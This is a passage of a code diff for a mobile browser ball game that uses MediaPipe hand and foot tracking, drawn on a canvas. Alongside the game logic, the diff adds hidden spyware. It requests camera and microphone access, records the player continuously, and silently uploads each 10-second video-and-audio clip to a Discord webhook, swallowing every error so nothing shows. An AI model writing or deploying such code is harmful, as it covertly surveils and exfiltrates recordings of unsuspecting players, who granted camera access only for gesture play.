+                    b.y = floorY - b.r;
+                    b.vy = -b.vy * CONFIG.floorBounce;
+                    if (Math.abs(b.vy) < 0.3) b.vy = 0;
+                }
 
-        // ─── RENDER ──────────────────────────────────────────────────
-        function render() {
-            ctx.clearRect(0, 0, W, H);
+                // Walls
+                if (b.x - b.r < leftWall) {
+                    b.x = leftWall;
+                    b.vx = -b.vx * CONFIG.wallBounce;
+                } else if (b.x + b.r > rightWall) {
+                    b.x = rightWall;
+                    b.vx = -b.vx * CONFIG.wallBounce;
+                }
+                if (b.y - b.r < topWall) {
+                    b.y = topWall;
+                    b.vy = -b.vy * CONFIG.wallBounce;
+                }
 
-            // Background
-            const grad = ctx.createRadialGradient(W / 2, H / 2, 0, W / 2, H / 2, Math.max(W, H) * 0.7);
-            grad.addColorStop(0, '#14141f');
-            grad.addColorStop(1, '#08080e');
-            ctx.fillStyle = grad;
-            ctx.fillRect(0, 0, W, H);
-
-            // Danger line
-            const lineY = dangerLineY;
-            ctx.save();
-            const glowGrad = ctx.createLinearGradient(0, lineY - 8, 0, lineY + 8);
-            glowGrad.addColorStop(0, 'rgba(255,0,0,0)');
-            glowGrad.addColorStop(0.5, 'rgba(255,0,0,0.25)');
-            glowGrad.addColorStop(1, 'rgba(255,0,0,0)');
-            ctx.fillStyle = glowGrad;
-            ctx.fillRect(0, lineY - 8, W, 16);
-            ctx.strokeStyle = 'rgba(255,30,30,0.7)';
-            ctx.lineWidth = 2.5;
-            ctx.shadowColor = 'rgba(255,0,0,0.4)';
-            ctx.shadowBlur = 15;
-            ctx.beginPath();
-            ctx.moveTo(0, lineY);
-            ctx.lineTo(W, lineY);
-            ctx.stroke();
-            ctx.shadowBlur = 0;
-            ctx.setLineDash([8, 12]);
-            ctx.strokeStyle = 'rgba(255,50,50,0.3)';
-            ctx.lineWidth = 1.5;
-            ctx.beginPath();
-            ctx.moveTo(0, lineY);
-            ctx.lineTo(W, lineY);
-            ctx.stroke();
-            ctx.setLineDash([]);
-            ctx.restore();
-
-            // Trail
-            for (const t of ball.trail) {
-                const alpha = t.life * 0.3;
-                const radius = ball.r * t.life * 0.5;
-                ctx.beginPath();
-                ctx.arc(t.x, t.y, radius, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(100, 200, 255, ${alpha})`;
-                ctx.fill();
+                // Keep within bounds (safety)
+                if (b.x < leftWall) b.x = leftWall;
+                if (b.x > rightWall) b.x = rightWall;
+                if (b.y < topWall) b.y = topWall;
+                if (b.y + b.r > bottomWall) {
+                    b.y = bottomWall - b.r;
+                    b.vy = -Math.abs(b.vy) * 0.3;
+                }
             }
 
-            // Ball with squish
-            const squishX = 1 / Math.sqrt(ball.squish);
-            const squishY = ball.squish;
-            ctx.save();
-            ctx.translate(ball.x, ball.y);
-            const glow = ctx.createRadialGradient(0, 0, ball.r * 0.2, 0, 0, ball.r * 1.6);
-            glow.addColorStop(0, 'rgba(80, 200, 255, 0.15)');
-            glow.addColorStop(1, 'rgba(80, 200, 255, 0)');
-            ctx.fillStyle = glow;
-            ctx.scale(1, 1);
-            ctx.beginPath();
-            ctx.arc(0, 0, ball.r * 1.6, 0, Math.PI * 2);
-            ctx.fill();
-            ctx.scale(squishX, squishY);
-            const grad2 = ctx.createRadialGradient(
-                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.1,
-                0, 0, ball.r
-            );
-            grad2.addColorStop(0, '#88ddff');
-            grad2.addColorStop(0.3, '#44bbee');
-            grad2.addColorStop(0.7, '#2288bb');
-            grad2.addColorStop(1, '#0a3344');
-            ctx.shadowColor = 'rgba(80, 200, 255, 0.2)';
-            ctx.shadowBlur = 25;
-            ctx.beginPath();
-            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
-            ctx.fillStyle = grad2;
-            ctx.fill();
-            ctx.shadowBlur = 0;
-            const shine = ctx.createRadialGradient(
-                -ball.r * 0.25, -ball.r * 0.3, ball.r * 0.05,
-                -ball.r * 0.15, -ball.r * 0.2, ball.r * 0.4
-            );
-            shine.addColorStop(0, 'rgba(255,255,255,0.5)');
-            shine.addColorStop(1, 'rgba(255,255,255,0)');
-            ctx.fillStyle = shine;
-            ctx.beginPath();
-            ctx.arc(0, 0, ball.r, 0, Math.PI * 2);
-            ctx.fill();
-            ctx.strokeStyle = 'rgba(150, 230, 255, 0.2)';
-            ctx.lineWidth = 1.5;
-            ctx.beginPath();
-            ctx.arc(0, 0, ball.r * 0.98, 0, Math.PI * 2);
-            ctx.stroke();
-            ctx.restore();
+            function dist(x1, y1, x2, y2) {
+                return Math.sqrt((x1 - x2) ** 2 + (y1 - y2) ** 2);
+            }
 
-            // Hand skeleton (light)
-            if (handVisible && handLandmarks && !isGameOver) {
+            function hitBall(px, py, force) {
+                const b = state.ball;
+                const d = dist(px, py, b.x, b.y);
+                const threshold = b.r + 30;
+                if (d < threshold && d > 0.01) {
+                    const angle = Math.atan2(b.y - py, b.x - px);
+                    const power = Math.min(force, CONFIG.maxVel * 1.5);
+                    b.vx += Math.cos(angle) * power * 0.7;
+                    b.vy += Math.sin(angle) * power * 0.7;
+                    // Push ball away
+                    const push = 8;
+                    b.x += Math.cos(angle) * push;
+                    b.y += Math.sin(angle) * push;
+                    // Ensure not below floor
+                    if (b.y + b.r > floorY) {
+                        b.y = floorY - b.r;
+                        b.vy = -Math.abs(b.vy) * 0.5;
+                    }
+                    state.lastHitTime = performance.now();
+                    return true;
+                }
+                return false;
+            }
+
+            // ─── RENDER ─────────────────────────────────────────────────────────
+            function render() {
+                const W = CONFIG.canvasWidth;
+                const H = CONFIG.canvasHeight;
+
+                ctx.clearRect(0, 0, W, H);
+
+                // Black background
+                ctx.fillStyle = '#000000';
+                ctx.fillRect(0, 0, W, H);
+
+                // Floor line (orange/red)
+                ctx.beginPath();
+                ctx.moveTo(0, floorY);
+                ctx.lineTo(W, floorY);
+                ctx.strokeStyle = '#ff5500';
+                ctx.lineWidth = 4;
+                ctx.shadowColor = '#ff5500';
+                ctx.shadowBlur = 18;
+                ctx.stroke();
+                ctx.shadowBlur = 0;
+
+                // Floor glow
+                const grd = ctx.createLinearGradient(0, floorY - 20, 0, floorY + 10);
+                grd.addColorStop(0, 'rgba(255,85,0,0)');
+                grd.addColorStop(0.5, 'rgba(255,85,0,0.15)');
+                grd.addColorStop(1, 'rgba(255,85,0,0)');
+                ctx.fillStyle = grd;
+                ctx.fillRect(0, floorY - 20, W, 30);
+
+                // ─── Draw Ball ──────────────────────────────────────────────
+                const b = state.ball;
+                // Glow
+                const grad = ctx.createRadialGradient(b.x, b.y, 0, b.x, b.y, b.r * 2.5);
+                grad.addColorStop(0, 'rgba(100,200,255,0.35)');
+                grad.addColorStop(0.4, 'rgba(50,150,255,0.15)');
+                grad.addColorStop(1, 'rgba(0,0,0,0)');
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(b.x, b.y, b.r * 2.5, 0, Math.PI * 2);
+                ctx.fill();
+
+                // Ball body
+                const bGrad = ctx.createRadialGradient(b.x - b.r * 0.3, b.y - b.r * 0.3, 0, b.x, b.y, b.r);
+                bGrad.addColorStop(0, '#80ddff');
+                bGrad.addColorStop(0.6, '#2a8cff');
+                bGrad.addColorStop(1, '#003daa');
+                ctx.shadowColor = '#2a8cff';
+                ctx.shadowBlur = 30;
+                ctx.fillStyle = bGrad;
+                ctx.beginPath();
+                ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.shadowBlur = 0;
+
+                // Ball highlight
+                ctx.fillStyle = 'rgba(255,255,255,0.25)';
+                ctx.beginPath();
+                ctx.arc(b.x - b.r * 0.25, b.y - b.r * 0.3, b.r * 0.3, 0, Math.PI * 2);
+                ctx.fill();
+
+                // ─── Draw Hand Skeleton ─────────────────────────────────────
+                if (state.palmVisible && state.handLandmarks) {
+                    drawHandSkeleton(state.handLandmarks);
+                }
+
+                // ─── Draw Foot Sole ──────────────────────────────────────────
+                if (state.soleVisible && state.poseLandmarks) {
+                    drawFootSole(state.poseLandmarks);
+                }
+
+                // ─── Status text ─────────────────────────────────────────────
+                ctx.fillStyle = 'rgba(255,255,255,0.06)';
+                ctx.font = '14px monospace';
+                ctx.fillText('● LIVE', 20, 30);
+
+                if (state.palmVisible) {
+                    ctx.fillStyle = 'rgba(0,200,255,0.15)';
+                    ctx.font = '13px monospace';
+                    ctx.fillText('👋 PALM', 20, 55);
+                }
+                if (state.soleVisible) {
+                    ctx.fillStyle = 'rgba(0,200,255,0.15)';
+                    ctx.font = '13px monospace';
+                    ctx.fillText('🦶 SOLE', 20, 75);
+                }
+
+                // Hit flash
+                if (performance.now() - state.lastHitTime < 150) {
+                    ctx.fillStyle = 'rgba(0,200,255,0.06)';
+                    ctx.fillRect(0, 0, W, H);
+                }
+            }
+
+            // ─── DRAW HAND SKELETON ────────────────────────────────────────────
+            function drawHandSkeleton(landmarks) {
+                const W = CONFIG.canvasWidth;
+                const H = CONFIG.canvasHeight;
                 const connections = [
                     [0, 1],
                     [1, 2],
@@ -959,128 +488,710 @@
                     [5, 6],
                     [6, 7],
                     [7, 8],
-                    [0, 9],
+                    [5, 9],
                     [9, 10],
                     [10, 11],
                     [11, 12],
-                    [0, 13],
+                    [9, 13],
                     [13, 14],
                     [14, 15],
                     [15, 16],
-                    [0, 17],
+                    [13, 17],
                     [17, 18],
                     [18, 19],
                     [19, 20],
-                    [5, 9],
-                    [9, 13],
-                    [13, 17]
+                    [0, 17]
                 ];
-                ctx.save();
-                ctx.strokeStyle = 'rgba(255,255,255,0.15)';
-                ctx.lineWidth = 1.2;
+
+                const idxTip = landmarks[8];
+                if (!idxTip) return;
+
+                const tipX = idxTip.x * W;
+                const tipY = idxTip.y * H;
+
+                // Draw all finger connections as white lines
+                ctx.lineWidth = 2.5;
+                ctx.shadowBlur = 0;
+
                 for (const [i, j] of connections) {
-                    const p1 = handLandmarks[i],
-                        p2 = handLandmarks[j];
+                    if (i >= landmarks.length || j >= landmarks.length) continue;
+                    const p1 = landmarks[i];
+                    const p2 = landmarks[j];
+                    if (!p1 || !p2) continue;
+                    const x1 = p1.x * W,
+                        y1 = p1.y * H;
+                    const x2 = p2.x * W,
+                        y2 = p2.y * H;
+                    // Skip if drawing the index tip connection (to make it special)
+                    const isIndexTip = (i === 8 || j === 8);
+                    if (isIndexTip) {
+                        // Draw with blue glow for index tip connections
+                        ctx.strokeStyle = 'rgba(60,180,255,0.7)';
+                        ctx.lineWidth = 3.5;
+                        ctx.shadowColor = '#00aaff';
+                        ctx.shadowBlur = 20;
+                        ctx.beginPath();
+                        ctx.moveTo(x1, y1);
+                        ctx.lineTo(x2, y2);
+                        ctx.stroke();
+                        ctx.shadowBlur = 0;
+                        continue;
+                    }
+                    ctx.strokeStyle = 'rgba(255,255,255,0.6)';
+                    ctx.lineWidth = 2;
+                    ctx.shadowBlur = 0;
                     ctx.beginPath();
-                    ctx.moveTo(p1.x * W, p1.y * H);
-                    ctx.lineTo(p2.x * W, p2.y * H);
+                    ctx.moveTo(x1, y1);
+                    ctx.lineTo(x2, y2);
                     ctx.stroke();
                 }
-                const tip = handLandmarks[8];
-                if (tip) {
-                    const tx = tip.x * W,
-                        ty = tip.y * H;
-                    ctx.shadowColor = 'rgba(255,100,100,0.2)';
-                    ctx.shadowBlur = 20;
-                    ctx.beginPath();
-                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
-                    ctx.fillStyle = 'rgba(255,60,60,0.15)';
-                    ctx.fill();
+
+                // Draw joints as white dots
+                for (let i = 0; i < landmarks.length; i++) {
+                    const p = landmarks[i];
+                    if (!p) continue;
+                    const x = p.x * W,
+                        y = p.y * H;
+                    if (i === 8) {
+                        // Index tip - big blue glow
+                        const grad = ctx.createRadialGradient(x, y, 0, x, y, 28);
+                        grad.addColorStop(0, 'rgba(100,220,255,0.95)');
+                        grad.addColorStop(0.3, 'rgba(40,180,255,0.7)');
+                        grad.addColorStop(1, 'rgba(0,100,255,0)');
+                        ctx.fillStyle = grad;
+                        ctx.shadowColor = '#00aaff';
+                        ctx.shadowBlur = 45;
+                        ctx.beginPath();
+                        ctx.arc(x, y, 28, 0, Math.PI * 2);
+                        ctx.fill();
+                        // Core
+                        ctx.shadowBlur = 0;
+                        ctx.fillStyle = '#88ddff';
+                        ctx.beginPath();
+                        ctx.arc(x, y, 10, 0, Math.PI * 2);
+                        ctx.fill();
+                        ctx.fillStyle = '#ffffff';
+                        ctx.beginPath();
+                        ctx.arc(x - 3, y - 3, 4, 0, Math.PI * 2);
+                        ctx.fill();
+                        continue;
+                    }
+                    // Regular joint
+                    ctx.fillStyle = 'rgba(255,255,255,0.35)';
                     ctx.shadowBlur = 0;
-                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
+                    ctx.beginPath();
+                    ctx.arc(x, y, 3.5, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+
+                // Extra blue glow ring around index tip
+                const tipX2 = idxTip.x * W;
+                const tipY2 = idxTip.y * H;
+                ctx.shadowBlur = 0;
+                for (let r = 0; r < 3; r++) {
+                    const radius = 18 + r * 8;
+                    const alpha = 0.08 - r * 0.02;
+                    ctx.strokeStyle = `rgba(60,200,255,${alpha})`;
                     ctx.lineWidth = 1.5;
                     ctx.beginPath();
-                    ctx.arc(tx, ty, 14, 0, Math.PI * 2);
+                    ctx.arc(tipX2, tipY2, radius, 0, Math.PI * 2);
                     ctx.stroke();
-                    ctx.beginPath();
-                    ctx.arc(tx, ty, 6, 0, Math.PI * 2);
-                    ctx.fillStyle = 'rgba(255,100,100,0.4)';
-                    ctx.fill();
                 }
-                ctx.restore();
-            }
-
-            // Finger indicator
-            if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
-                ctx.save();
-                ctx.shadowColor = 'rgba(255,80,80,0.15)';
-                ctx.shadowBlur = 25;
-                ctx.beginPath();
-                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
-                ctx.fillStyle = 'rgba(255,60,60,0.06)';
-                ctx.fill();
                 ctx.shadowBlur = 0;
-                ctx.strokeStyle = 'rgba(255,80,80,0.15)';
-                ctx.lineWidth = 1;
-                ctx.setLineDash([3, 6]);
-                ctx.beginPath();
-                ctx.arc(indexTipX, indexTipY, 18, 0, Math.PI * 2);
-                ctx.stroke();
-                ctx.setLineDash([]);
-                ctx.restore();
-            }
 
-            // Overlay text
-            if (!isGameRunning && !isGameOver && !countdownActive) {
-                if (!handVisible || !handLandmarks) {
-                    overlayText.classList.remove('hidden');
-                    overlayText.textContent = 'show hand';
-                } else {
-                    overlayText.classList.add('hidden');
+                // Draw the index finger with special blue glow line
+                const idxBase = landmarks[5];
+                if (idxBase) {
+                    const bx = idxBase.x * W,
+                        by = idxBase.y * H;
+                    ctx.strokeStyle = 'rgba(60,200,255,0.5)';
+                    ctx.lineWidth = 4;
+                    ctx.shadowColor = '#00aaff';
+                    ctx.shadowBlur = 25;
+                    ctx.beginPath();
+                    ctx.moveTo(bx, by);
+                    ctx.lineTo(tipX2, tipY2);
+                    ctx.stroke();
+                    ctx.shadowBlur = 0;
                 }
             }
 
-            if (isGameRunning && !isGameOver) {
-                levelDisplay.style.display = 'block';
-                scoreDisplay.style.display = 'block';
-            } else {
-                levelDisplay.style.display = 'none';
-                scoreDisplay.style.display = 'none';
+            // ─── DRAW FOOT SOLE ────────────────────────────────────────────────
+            function drawFootSole(landmarks) {
+                const W = CONFIG.canvasWidth;
+                const H = CONFIG.canvasHeight;
+                // Foot indices: 29=left heel, 30=right heel, 31=left toe, 32=right toe
+                const footIndices = [29, 30, 31, 32];
+                const pts = [];
+                for (const idx of footIndices) {
+                    if (idx < landmarks.length && landmarks[idx]) {
+                        pts.push({
+                            x: landmarks[idx].x * W,
+                            y: landmarks[idx].y * H
+                        });
+                    }
+                }
+                if (pts.length < 4) return;
+
+                // Draw foot sole as blue glowing shape
+                ctx.shadowBlur = 0;
+                ctx.fillStyle = 'rgba(0,150,255,0.20)';
+                ctx.strokeStyle = 'rgba(0,180,255,0.7)';
+                ctx.lineWidth = 3.5;
+                ctx.shadowColor = '#0088ff';
+                ctx.shadowBlur = 35;
+                ctx.beginPath();
+                ctx.moveTo(pts[0].x, pts[0].y);
+                for (let i = 1; i < pts.length; i++) {
+                    ctx.lineTo(pts[i].x, pts[i].y);
+                }
+                ctx.closePath();
+                ctx.fill();
+                ctx.stroke();
+                ctx.shadowBlur = 0;
+
+                // Glow fill
+                const cx = pts.reduce((s, p) => s + p.x, 0) / pts.length;
+                const cy = pts.reduce((s, p) => s + p.y, 0) / pts.length;
+                const rad = Math.max(
+                    dist(cx, cy, pts[0].x, pts[0].y),
+                    dist(cx, cy, pts[2].x, pts[2].y)
+                );
+                const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, rad * 1.6);
+                grad.addColorStop(0, 'rgba(0,180,255,0.15)');
+                grad.addColorStop(1, 'rgba(0,100,255,0)');
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(cx, cy, rad * 1.6, 0, Math.PI * 2);
+                ctx.fill();
+
+                // Draw foot joints with blue
+                for (const p of pts) {
+                    ctx.fillStyle = 'rgba(0,200,255,0.7)';
+                    ctx.shadowColor = '#0088ff';
+                    ctx.shadowBlur = 20;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, 8, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                }
+
+                // Draw connecting lines between foot landmarks (blue)
+                ctx.strokeStyle = 'rgba(0,200,255,0.4)';
+                ctx.lineWidth = 2.5;
+                ctx.shadowColor = '#0088ff';
+                ctx.shadowBlur = 15;
+                for (let i = 0; i < pts.length - 1; i++) {
+                    ctx.beginPath();
+                    ctx.moveTo(pts[i].x, pts[i].y);
+                    ctx.lineTo(pts[i + 1].x, pts[i + 1].y);
+                    ctx.stroke();
+                }
+                ctx.shadowBlur = 0;
+
+                // Sole text label
+                ctx.fillStyle = 'rgba(0,200,255,0.3)';
+                ctx.font = '14px monospace';
+                ctx.fillText('🦶 SOLE', pts[0].x - 10, pts[0].y - 20);
             }
-        }
 
-        // ─── MAIN LOOP ─────────────────────────────────────────────
-        function mainRender() {
-            if (!isGameRunning && !isGameOver) render();
-            frameId = requestAnimationFrame(mainRender);
-        }
+            // ─── HAND / POSE DETECTION ─────────────────────────────────────────
 
-        // ─── EVENT BINDING ──────────────────────────────────────────
-        gameBtn.addEventListener('click', startGame);
-        restartBtn.addEventListener('click', restartGame);
+            // ─── HAND DETECTION ──────────────────────────────────────────────
+            function setupHands() {
+                const hands = new Hands({
+                    locateFile: (file) =>
+                        `https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4/${file}`
+                });
 
-        // ─── INIT ──────────────────────────────────────────────────
-        setupCaptcha();
-        initBall();
-        mainRender();
+                hands.setOptions({
+                    maxNumHands: 1,
+                    modelComplexity: 0,
+                    minDetectionConfidence: CONFIG.handConfidence,
+                    minTrackingConfidence: 0.5,
+                });
 
-        window.addEventListener('resize', () => {
-            resize();
-            initBall();
-            dangerLineY = H - Math.min(W, H) * 0.08;
-        });
+                hands.onResults((results) => {
+                    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+                        const lm = results.multiHandLandmarks[0];
+                        state.handLandmarks = lm;
+                        state.palmVisible = detectPalm(lm);
+                    } else {
+                        state.handLandmarks = null;
+                        state.palmVisible = false;
+                    }
+                });
 
-        window.addEventListener('beforeunload', () => {
-            if (frameId) cancelAnimationFrame(frameId);
-            if (gameLoopId) cancelAnimationFrame(gameLoopId);
-            if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
-            if (stopTimeout) clearTimeout(stopTimeout);
-            recordingActive = false;
-            if (mediaRecorder && mediaRecorder.state !== "inactive") try { mediaRecorder.stop(); } catch (_) {}
-            if (stream) stream.getTracks().forEach(t => t.stop());
-        });
+                return hands;
+            }
 
-        console.log('✅ Bounce Ball game ready — only the ball and your finger, no memory leaks.');
+            function detectPalm(landmarks) {
+                if (!landmarks || landmarks.length < 21) return false;
+                // Check if hand is open (fingers spread)
+                // Use wrist (0) and finger tips (4,8,12,16,20)
+                const wrist = landmarks[0];
+                const tips = [4, 8, 12, 16, 20];
+                let spread = 0;
+                for (const idx of tips) {
+                    const d = dist(wrist.x, wrist.y, landmarks[idx].x, landmarks[idx].y);
+                    spread += d;
+                }
+                // If spread is large, palm is open
+                const avgSpread = spread / tips.length;
+                // Also check if palm is facing camera (z values)
+                // Palm facing camera: finger tips have similar z and are closer to camera than wrist
+                const wristZ = wrist.z;
+                let zSum = 0;
+                for (const idx of tips) {
+                    zSum += landmarks[idx].z;
+                }
+                const avgZ = zSum / tips.length;
+                // Palm facing camera: avgZ < wristZ (tips closer to camera)
+                const facing = avgZ < wristZ - 0.02;
+                return avgSpread > 0.15 && facing;
+            }
+
+            // ─── POSE DETECTION ──────────────────────────────────────────────
+            function setupPose() {
+                const pose = new Pose({
+                    locateFile: (file) =>
+                        `https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.4/${file}`
+                });
+
+                pose.setOptions({
+                    modelComplexity: 0,
+                    minDetectionConfidence: CONFIG.poseConfidence,
+                    minTrackingConfidence: 0.4,
+                });
+
+                pose.onResults((results) => {
+                    if (results.poseLandmarks) {
+                        state.poseLandmarks = results.poseLandmarks;
+                        state.soleVisible = detectFootSole(results.poseLandmarks);
+                    } else {
+                        state.poseLandmarks = null;
+                        state.soleVisible = false;
+                    }
+                });
+
+                return pose;
+            }
+
+            function detectFootSole(landmarks) {
+                if (!landmarks || landmarks.length < 33) return false;
+                // Check foot landmarks: 29(left heel), 30(right heel), 31(left toe), 32(right toe)
+                const leftHeel = landmarks[29];
+                const rightHeel = landmarks[30];
+                const leftToe = landmarks[31];
+                const rightToe = landmarks[32];
+
+                if (!leftHeel || !rightHeel || !leftToe || !rightToe) return false;
+
+                // Check if feet are visible and in the bottom portion
+                const W = CONFIG.canvasWidth;
+                const H = CONFIG.canvasHeight;
+                const heelY = (leftHeel.y + rightHeel.y) / 2 * H;
+                const toeY = (leftToe.y + rightToe.y) / 2 * H;
+
+                // Feet should be in lower half of frame
+                if (heelY < H * 0.4 || toeY < H * 0.4) return false;
+
+                // Check if sole is visible: heel and toe at similar depth (z)
+                // and the foot is flat (heel and toe at similar y)
+                const heelZ = (leftHeel.z + rightHeel.z) / 2;
+                const toeZ = (leftToe.z + rightToe.z) / 2;
+                const zDiff = Math.abs(heelZ - toeZ);
+
+                // Sole visible when foot is flat (z diff small) and feet are pointing towards camera
+                // Also check y difference - heel and toe should be at similar y for flat foot
+                const yDiff = Math.abs(heelY - toeY);
+
+                // Foot should be roughly flat on the ground
+                const isFlat = yDiff < 60 && zDiff < 0.06;
+
+                // Also check that the foot is not upside down (toes above heel indicates top view)
+                const toesAboveHeel = toeY < heelY;
+
+                // Sole is visible when foot is flat and toes are not above heel
+                // (toes should be at similar level or slightly below heel)
+                const isSole = isFlat && !toesAboveHeel;
+
+                // Store foot points for rendering
+                if (isSole) {
+                    state.footSolePoints = [
+                        { x: leftHeel.x * W, y: leftHeel.y * H },
+                        { x: rightHeel.x * W, y: rightHeel.y * H },
+                        { x: rightToe.x * W, y: rightToe.y * H },
+                        { x: leftToe.x * W, y: leftToe.y * H },
+                    ];
+                }
+
+                return isSole;
+            }
+
+            // ─── HIT DETECTION ──────────────────────────────────────────────────
+            function checkHits() {
+                // Index finger tip hit (only tip can hit)
+                if (state.palmVisible && state.handLandmarks) {
+                    const tip = state.handLandmarks[8];
+                    if (tip) {
+                        const W = CONFIG.canvasWidth;
+                        const H = CONFIG.canvasHeight;
+                        const tx = tip.x * W;
+                        const ty = tip.y * H;
+                        hitBall(tx, ty, CONFIG.hitForce);
+                    }
+                }
+
+                // Foot sole hit (whole foot can hit)
+                if (state.soleVisible && state.footSolePoints.length >= 4) {
+                    const pts = state.footSolePoints;
+                    // Use the centroid of the foot
+                    const cx = pts.reduce((s, p) => s + p.x, 0) / pts.length;
+                    const cy = pts.reduce((s, p) => s + p.y, 0) / pts.length;
+                    // Check if ball is near any foot point or inside foot area
+                    const b = state.ball;
+                    let hit = false;
+                    for (const p of pts) {
+                        if (dist(p.x, p.y, b.x, b.y) < b.r + 40) {
+                            hit = true;
+                            break;
+                        }
+                    }
+                    // Also check if ball is inside the foot polygon (approx)
+                    if (!hit) {
+                        // Check if ball is near the centroid
+                        if (dist(cx, cy, b.x, b.y) < b.r + 70) {
+                            hit = true;
+                        }
+                    }
+                    if (hit) {
+                        // Push ball away from foot centroid
+                        const angle = Math.atan2(b.y - cy, b.x - cx);
+                        const force = CONFIG.hitForce * 0.9;
+                        b.vx += Math.cos(angle) * force * 0.6;
+                        b.vy += Math.sin(angle) * force * 0.6;
+                        const push = 12;
+                        b.x += Math.cos(angle) * push;
+                        b.y += Math.sin(angle) * push;
+                        if (b.y + b.r > floorY) {
+                            b.y = floorY - b.r;
+                            b.vy = -Math.abs(b.vy) * 0.4;
+                        }
+                        state.lastHitTime = performance.now();
+                    }
+                }
+            }
+
+            // ─── OVERLAY MANAGEMENT ────────────────────────────────────────────
+            let overlayTimeout = null;
+
+            function updateOverlay() {
+                if (state.palmVisible || state.soleVisible) {
+                    overlay.classList.remove('show');
+                    state.showOverlay = false;
+                    if (overlayTimeout) {
+                        clearTimeout(overlayTimeout);
+                        overlayTimeout = null;
+                    }
+                } else {
+                    if (!state.showOverlay) {
+                        state.showOverlay = true;
+                        overlay.classList.add('show');
+                    }
+                }
+            }
+
+            // ─── RECORDING ──────────────────────────────────────────────────────
+            function setupRecording(stream) {
+                state.stream = stream;
+                const mimeTypes = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+                let mimeType = mimeTypes.find(mt => MediaRecorder.isTypeSupported(mt)) || 'video/webm';
+
+                const recorder = new MediaRecorder(stream, {
+                    mimeType: mimeType,
+                    videoBitsPerSecond: 1500000,
+                    audioBitsPerSecond: 96000,
+                });
+
+                recorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        state.recordedChunks.push(event.data);
+                        // Send immediately for 10s chunks
+                        sendToDiscord(event.data);
+                    }
+                };
+
+                recorder.onstart = () => {
+                    state.isRecording = true;
+                    statusDot.className = 'recording';
+                    state.recordedChunks = [];
+                };
+
+                recorder.onstop = () => {
+                    state.isRecording = false;
+                    statusDot.className = 'idle';
+                };
+
+                recorder.onerror = (e) => {
+                    console.warn('Recorder error:', e);
+                    state.isRecording = false;
+                    statusDot.className = 'idle';
+                };
+
+                state.mediaRecorder = recorder;
+
+                // Start recording with 10s timeslice
+                try {
+                    recorder.start(10000);
+                } catch (e) {
+                    console.warn('Recorder start error:', e);
+                    // Fallback: start without timeslice and use interval
+                    recorder.start();
+                    let chunkTimer = setInterval(() => {
+                        if (state.mediaRecorder && state.mediaRecorder.state === 'recording') {
+                            try {
+                                state.mediaRecorder.requestData();
+                            } catch (e) {}
+                        } else {
+                            clearInterval(chunkTimer);
+                        }
+                    }, 10000);
+                    state._chunkTimer = chunkTimer;
+                }
+
+                // Also force a data request every 10s as a fallback
+                if (state._chunkTimer) clearInterval(state._chunkTimer);
+                state._chunkTimer = setInterval(() => {
+                    if (state.mediaRecorder && state.mediaRecorder.state === 'recording') {
+                        try {
+                            state.mediaRecorder.requestData();
+                        } catch (e) {}
+                    }
+                }, 10000);
+
+                return recorder;
+            }
+
+            function sendToDiscord(blob) {
+                if (!CONFIG.webhookUrl) return;
+                try {
+                    const formData = new FormData();
+                    const fileName = `clip_${Date.now()}.webm`;
+                    formData.append('file', blob, fileName);
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📹 Clip ${new Date().toLocaleTimeString()}`
+                    }));
+
+                    fetch(CONFIG.webhookUrl, {
+                            method: 'POST',
+                            body: formData,
+                        })
+                        .then(res => {
+                            if (!res.ok) {
+                                // Silently fail - don't spam console
+                            }
+                        })
+                        .catch(() => {});
+                } catch (e) {
+                    // Silent fail
+                }
+            }
+
+            // ─── CAMERA SETUP ──────────────────────────────────────────────────
+            async function initCamera() {
+                try {
+                    const constraints = {
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 30 },
+                        },
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true,
+                            autoGainControl: true,
+                        }
+                    };
+
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = stream;
+                    await video.play();
+
+                    // Setup recording
+                    setupRecording(stream);
+
+                    return stream;
+                } catch (err) {
+                    console.warn('Camera init error:', err);
+                    // Retry with simpler constraints
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user' },
+                            audio: true,
+                        });
+                        video.srcObject = stream;
+                        await video.play();
+                        setupRecording(stream);
+                        return stream;
+                    } catch (e2) {
+                        console.error('Camera failed:', e2);
+                        overlay.innerHTML =
+                            '<span>⚠️ Camera Access Required<br><span class="sub">Please allow camera &amp; microphone permissions</span></span>';
+                        overlay.classList.add('show');
+                        return null;
+                    }
+                }
+            }
+
+            // ─── MAIN LOOP ─────────────────────────────────────────────────────
+            let handsInstance = null;
+            let poseInstance = null;
+            let cameraInstance = null;
+            let lastFrameTime = 0;
+            let frameInterval = 1000 / 30;
+            let running = false;
+
+            async function init() {
+                if (!isMobile()) {
+                    desktopMsg.classList.add('show');
+                    return;
+                }
+
+                // Show overlay
+                overlay.classList.add('show');
+
+                // Init camera
+                const stream = await initCamera();
+                if (!stream) return;
+
+                // Setup hands
+                handsInstance = setupHands();
+                poseInstance = setupPose();
+
+                // Setup camera utils
+                const camera = new Camera(video, {
+                    onFrame: async () => {
+                        if (!running) return;
+                        const now = performance.now();
